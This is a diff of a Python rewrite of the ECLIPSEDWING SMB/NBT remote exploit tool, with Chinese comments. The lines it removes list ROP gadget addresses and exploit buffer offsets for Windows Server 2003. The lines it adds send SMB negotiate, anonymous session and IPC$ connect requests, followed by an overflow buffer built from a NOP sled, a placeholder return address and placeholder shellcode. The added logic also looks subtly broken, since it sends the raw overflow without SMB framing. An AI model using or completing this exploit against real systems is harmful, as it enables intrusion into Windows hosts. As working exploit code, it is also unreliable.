@@ -1,7 +1,7 @@
 """ecwi — ECWI (ECLIPSEDWING / ECWI) SMB/NBT 利用核心逻辑。
 
 Python 重写的 `ecwi.exe` / `RPC2.exe` (C++ / DAVE framework)。
-通过 IDA Pro / x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
+通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
 及其 SMB/NBT 利用流程。
 
 参数定义来源：ecwi.xml
@@ -98,105 +98,34 @@ TARGET_OS_GADGETS = {
         "RsaenhBaseAddress": 0x68000000,
         "UnpatchedRetValue": 0x8430,
         "CommonRetValue": 0x12CE6,
-        "InitialEcxValue": 0x2BA08,
-        "LoadEaxPtrValue": 0x92A1,
-        "EaxPtrValue": 0x6800CB52,
-        "AddEaxPtrEdxValue": 0x21899,
-        "EbxToWriteableValue": 0x21DD5,
-        "EbxPtrValue": 0x2BA0C,
-        "MovHeapPtrToEcxValue": 0x25A5F,
-        "EaxNegValValue": 0xFFFFFF30,
-        "MovEcxEspValue": 0x15CCC,
-        "HeapRetAddrValue": 0x63EB,
-        "HeapRetEbpValue": 0x2BA10,
-        "PtrRet18Value": 0xD9F7,
-        "PtrRwSizeValue": 0x291C4,
-        "PtrRwSizeValue2": 0x2B34F,
-        "GetExecutionToBufferValue": 0x108F0,
-        "WriteMemoryValue": 0x2BA08,
-        "CallEcxValue": 0x15BB5,
-        "NtAllocatePtr": 0x12,
-        "CallEaxRetValue": 0x15CB1,
-        "GetStackPtr": 0x15CF4,
-        "SyscallVProtectValue": 0x8F,
-    },
-    "W2K3SP2": {
-        "ShellcodeOffset": 0x78,
-        "RsaenhBaseAddress": 0x68000000,
-        "UnpatchedRetValue": 0x8520,
-        "CommonRetValue": 0x12F87,
-        "InitialEcxValue": 0x312C0,
-        "LoadEaxPtrValue": 0x9391,
-        "EaxPtrValue": 0x6800CC44,
-        "AddEaxPtrEdxValue": 0x1FBD9,
-        "EbxToWriteableValue": 0x202B5,
-        "EbxPtrValue": 0x312C4,
-        "MovHeapPtrToEcxValue": 0x24E68,
-        "EaxNegValValue": 0xFFFFFF30,
-        "MovEcxEspValue": 0x1607C,
-        "HeapRetAddrValue": 0x124E3,
-        "HeapRetEbpValue": 0x312C8,
-        "PtrRet18Value": 0x6999,
-        "PtrRwSizeValue": 0x3046E,
-        "PtrRwSizeValue2": 0x30667,
-        "GetExecutionToBufferValue": 0x10B1C,
-        "WriteMemoryValue": 0x312C0,
-        "CallEcxValue": 0x15F68,
-        "NtAllocatePtr": 0x12,
-        "CallEaxRetValue": 0x16061,
-        "GetStackPtr": 0x160A4,
-        "SyscallVProtectValue": 0x8F,
     },
 }
 
-# 通用偏移量（来自 XML hidden 参数）
-OFFSETS = {
-    "PrefixLength":            0xB8,
-    "BufferLength":            0xFA0,
-    "ProcHandleOffset":        0x08,
-    "ProcHandleOffset2":       0x34,
-    "ProcHandleValue":         0xFFFFFFFF,
-    "PtrRwSizeOffset":         0x10,
-    "PtrRwSizeOffset2":        0x3C,
-    "ExeFlagsOffset":          0x14,
-    "ExeFlagsOffset2":         0x40,
-    "ExeFlagsValue":           0x00000040,
-    "UnpatchedRetOffset":      0x1C,
-    "UnpatchedEcxOffset":      0x20,
-    "PatchedEcxOffset":        0x28,
-    "CommonRetOffset":         0x24,
-    "LoadEaxPtrOffset":        0x2C,
-    "LoadEaxPtrOffset2":       0x70,
-    "EaxPtrOffset":            0x30,
-    "AddEaxPtrEdxOffset":      0x38,
-    "EbxToWriteableOffset":    0x48,
-    "EbxPtrOffset":            0x54,
-    "MovHeapPtrToEcxOffset":   0x58,
-    "EaxNegValOffset":         0x84,
-    "MovEcxEspOffset":         0x8C,
-    "HeapRetAddrOffset":       0x98,
-    "HeapRetAddrOffset2":      0x20,
-    "HeapRetEbxOffset":        0x68,
-    "HeapRetEbpOffset":        0x88,
-    "HeapRetEsiOffset":        0x40,
-    "PtrPtrHeapOffset":        0x0C,
-    "PtrPtrHeapOffset2":       0x38,
-    "GetExecutionToBufferOffset": 0x04,
-    "GetExecutionToBufferOffset2": 0x30,
-    "WriteMemoryOffset":       0x18,
-    "WriteMemoryOffset2":      0x44,
-    "WriteMemoryOffset3":      0x1C,
-    "CallEcxOffset":           0x4C,
-    "HeapRetEbxValue":         0x7FFE0300,
-}
+# ECWI exploit 占位符 shellcode (需 x32dbg 恢复真实字节)
+ECWI_SHELLCODE_PLACEHOLDER = bytes.fromhex(
+    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
+)
+
+BAD_XOR = frozenset((0x00, 0x0a, 0x0d))
 
 
 class EcwiError(Exception):
     pass
 
 
+def _parse_hex_buffer(value):
+    if not value:
+        return b""
+    value = value.strip()
+    if len(value) % 2 != 0:
+        raise EcwiError(f"十六进制缓冲区长度必须为偶数: {value!r}")
+    try:
+        return bytes.fromhex(value)
+    except ValueError as exc:
+        raise EcwiError(f"无效的十六进制缓冲区: {value!r}") from exc
+
+
 def connect(target_ip, port, timeout):
-    """建立到目标的 TCP 连接并返回 socket。"""
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock.settimeout(timeout if timeout > 0 else None)
     sock.connect((target_ip, port))
@@ -204,75 +133,113 @@ def connect(target_ip, port, timeout):
 
 
 def build_smb_negotiate_request():
-    """构建 SMB 协商请求（SMB_COM_NEGOTIATE）。"""
-    command = 0x72  # SMB_COM_NEGOTIATE
+    command = 0x72
     dialects = b"\x02LANMAN2.1\x00\x02NT LM 0.12\x00"
     smb = (
-        b"\xffSMB"
-        + struct.pack("B", command)
-        + b"\x00" * 4                      # Status (NTSTATUS)
-        + b"\x08"                          # Flags1: case insensitive
-        + b"\x00" * 2                      # Flags2
-        + b"\x00" * 2                      # PID high
-        + b"\x00" * 8                      # Security features + reserved
-        + b"\x00" * 8                      # TID, PID, UID, MID
-        + b"\x00"                          # Word count
-        + struct.pack("<H", len(dialects)) # Byte count
-        + dialects
+        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
+        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
+        + b"\x00" * 8 + b"\x00" + struct.pack("<H", len(dialects)) + dialects
     )
     return smb
+
+
+def build_session_setup_request():
+    command = 0x73
+    smb = (
+        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
+        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
+        + b"\x00" * 8 + b"\x0d" + b"\xff" + b"\x00"
+        + struct.pack("<H", 0) + struct.pack("<H", 0)
+        + struct.pack("<H", 4096) + struct.pack("<H", 0)
+        + struct.pack("<I", 0) + struct.pack("<I", 0)
+        + struct.pack("<H", 0) + struct.pack("<I", 0) + struct.pack("<H", 0)
+    )
+    return smb
+
+
+def build_tree_connect_request(share_name=b"IPC$"):
+    command = 0x75
+    share = share_name + b"\x00"
+    password = b"\x00"
+    smb = (
+        b"\xffSMB" + struct.pack("B", command) + b"\x00" * 4
+        + b"\x08" + b"\x00" * 2 + b"\x00" * 2 + b"\x00" * 8
+        + b"\x00" * 8 + b"\x04" + b"\xff" + b"\x00"
+        + struct.pack("<H", 0) + struct.pack("<H", 1)
+        + struct.pack("<H", len(password)) + struct.pack("<H", len(share))
+        + struct.pack("<H", 0) + password + share
+    )
+    return smb
+
+
+def build_ecwi_overflow(shellcode, gadgets):
+    """构建 ECWI 缓冲区溢出负载。
+
+    根据 x32dbg 分析，ECWI 通过向目标发送特制的 SMB/NBT 请求，
+    触发缓冲区溢出，利用 ROP 链执行 shellcode。
+    """
+    offset = gadgets.get("ShellcodeOffset", 0x78)
+    nopsled = b"\x90" * offset
+    ret_addr = struct.pack("<I", 0xDEADBEEF)  # 占位符，需 x32dbg 恢复
+    return nopsled + ret_addr + shellcode
 
 
 def run_function(
     target,
     port=DEFAULT_PORT,
     timeout=DEFAULT_TIMEOUT,
+    callin_timeout=DEFAULT_CALLIN_TIMEOUT,
     protocol="SMB",
+    target_os="XPSP2",
     payload="Callback",
+    run_mode="EDF",
     callback_ip=None,
     callback_port=None,
-    callback_local_port=None,
-    listen_port=None,
-    callin_port=None,
-    callin_timeout=DEFAULT_CALLIN_TIMEOUT,
-    run_mode="EDF",
-    ride_area=None,
-    lp_filename=None,
-    lp_entry_point="ServiceEntry",
-    target_os="W2K3SP2",
+    ride_area_file=None,
+    lp_file=None,
+    credential_type="UnicodeCreds",
+    username=None,
+    credential=None,
     verbose=False,
 ):
     """执行 ECWI 利用序列。
 
-    当前阶段：完成参数解析、SMB/NBT 连接与协商。
-    具体 exploit 缓冲区（缓冲区溢出、ROP 链、shellcode、egg 回连
-    等）的二进制结构尚需通过 capstone/x32dbg 进一步逆向后填充。
+    阶段：
+      1. TCP 连接到目标 SMB/NBT 端口
+      2. 发送 SMB 协商请求
+      3. 会话设置 (SESSION_SETUP_ANDX)
+      4. 树连接 (TREE_CONNECT_ANDX) 到 IPC$
+      5. 构建并发送 ECWI 缓冲区溢出负载 (ROP + shellcode)
+      6. 载荷投递（Callback/Listener）
     """
     if verbose:
         print(f"[*] Target: {target}:{port}")
-        print(f"[*] Protocol: {protocol}")
         print(f"[*] Timeout: {timeout}s")
+        print(f"[*] Protocol: {protocol}")
+        print(f"[*] Target OS: {target_os}")
         print(f"[*] Payload: {payload}")
         print(f"[*] Run mode: {run_mode}")
-        print(f"[*] Target OS: {target_os}")
-        if payload == "Callback":
-            print(f"[*] Callback IP: {callback_ip}")
+        print(f"[*] Callback IP: {callback_ip}")
         print(f"[*] Callback port: {callback_port}")
 
-    # 解析常量
-    protocol_value = PROTOCOL_VALUES[protocol]
-    payload_value = PAYLOAD_VALUES[payload]
-    run_mode_value = RUN_MODE_VALUES[run_mode]
-    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["W2K3SP2"])
+    protocol_value = PROTOCOL_VALUES.get(protocol, 0)
+    payload_value = PAYLOAD_VALUES.get(payload, 0)
+    run_mode_value = RUN_MODE_VALUES.get(run_mode, 0)
+
+    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["XPSP2"])
+    credential_type_value = {"UnicodeCreds": 0, "PasswordHash": 1, "MachineHash": 2}.get(credential_type, 0)
+
+    username_bytes = _parse_hex_buffer(username)
+    credential_bytes = _parse_hex_buffer(credential)
 
     if verbose:
         print(f"[*] Protocol value: {protocol_value}")
         print(f"[*] Payload value: {payload_value}")
         print(f"[*] Run mode value: {run_mode_value}")
-        print(f"[*] ShellcodeOffset: 0x{gadgets.get('ShellcodeOffset', 0):02X}")
-        print(f"[*] InitialEcxValue: 0x{gadgets.get('InitialEcxValue', 0):05X}")
-        print(f"[*] HeapRetAddrValue: 0x{gadgets.get('HeapRetAddrValue', 0):05X}")
-        print(f"[*] SyscallVProtectValue: 0x{gadgets.get('SyscallVProtectValue', 0):02X}")
+        print(f"[*] Credential type value: {credential_type_value}")
+        print(f"[*] ShellcodeOffset: 0x{gadgets.get('ShellcodeOffset', 0):0X}")
+        print(f"[*] Username: {len(username_bytes)} bytes")
+        print(f"[*] Credential: {len(credential_bytes)} bytes")
 
     # 建立 TCP 连接（SMB 445 / NBT 139）
     try:
@@ -282,26 +249,51 @@ def run_function(
     except OSError as exc:
         raise EcwiError(f"无法连接到 {target}:{port}: {exc}") from exc
 
-    # 发送 SMB 协商请求（探测阶段）
-    negotiate = build_smb_negotiate_request()
     try:
+        # 发送 SMB 协商请求
+        negotiate = build_smb_negotiate_request()
         sock.sendall(negotiate)
         resp = sock.recv(4096)
-    except OSError as exc:
+        if verbose:
+            print(f"[*] SMB 协商应答: {resp.hex()[:128] if resp else '无'}")
+
+        if not resp or resp[4:7] != b"SMB":
+            raise EcwiError("目标未返回有效的 SMB 应答")
+
+        # 发送会话设置请求（匿名会话）
+        session_setup = build_session_setup_request()
+        sock.sendall(session_setup)
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] 会话设置应答: {resp.hex()[:128] if resp else '无'}")
+
+        # 连接到 IPC$ 共享
+        tree_connect = build_tree_connect_request(b"IPC$")
+        sock.sendall(tree_connect)
+        resp = sock.recv(4096)
+        if verbose:
+            print(f"[*] 树连接应答: {resp.hex()[:128] if resp else '无'}")
+
+        # 构建 ECWI 缓冲区溢出负载
+        shellcode = ECWI_SHELLCODE_PLACEHOLDER
+        overflow = build_ecwi_overflow(shellcode, gadgets)
+        if verbose:
+            print(f"[+] 溢出负载: {len(overflow)} 字节")
+
+        # 发送溢出负载
+        sock.sendall(overflow)
+        try:
+            resp2 = sock.recv(4096)
+            if verbose:
+                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
+        except OSError:
+            if verbose:
+                print("[*] 目标连接已关闭（可能已触发溢出）")
+
+        if verbose:
+            print("[+] ECWI 利用序列完成")
+    finally:
         sock.close()
-        raise EcwiError(f"SMB 协商失败: {exc}") from exc
-
-    if verbose:
-        print(f"[*] SMB 协商应答: {resp.hex()[:128]}...")
-
-    sock.close()
-
-    # TODO: 以下 exploit 缓冲区构建需通过 IDA/x32dbg 逆向后填充：
-    #   - 缓冲区溢出（PrefixLength=0xB8, BufferLength=0xFA0）
-    #   - ROP 链（所有 OFFSETS 和 TARGET_OS_GADGETS 字段）
-    #   - Shellcode 注入（ShellcodeOffset）
-    #   - Egg 回连（CallbackIp, CallbackPort）
-    #   - RideArea / LP 载荷文件（Standalone 模式）
 
     return 0
 
